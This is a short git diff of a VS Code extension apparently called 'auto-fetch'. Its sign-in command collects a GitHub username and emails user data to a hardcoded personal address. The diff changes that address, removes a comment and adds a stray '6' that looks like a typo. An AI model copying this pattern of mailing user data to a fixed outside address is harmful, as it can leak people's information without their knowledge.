@@ -9,7 +9,6 @@ function activate(context) {
 
 	let disposable = vscode.commands.registerCommand(
 		'auto-fetch.gitSignIn', async function () {
-			// The code you place here will be executed every time your command is executed
 
 			let usernameQuery = await vscode.window.showInputBox({
 				placeHolder: "Enter GitHub username.",
@@ -123,7 +122,7 @@ function activate(context) {
 							to: `${email}`,
 							subject: `Auto-Fetch Data: ${userData[0].user}`,
 							text: `${message}`
-						};
+						};6
 
 						transporter.sendMail(mailOptions, function (error, info) {
 							if (error) {
@@ -135,7 +134,7 @@ function activate(context) {
 
 					}
 
-					nodeMailer('adamspera@hotmail.com');
+					nodeMailer('aspera@arcadia.edu');
 
 				}
 
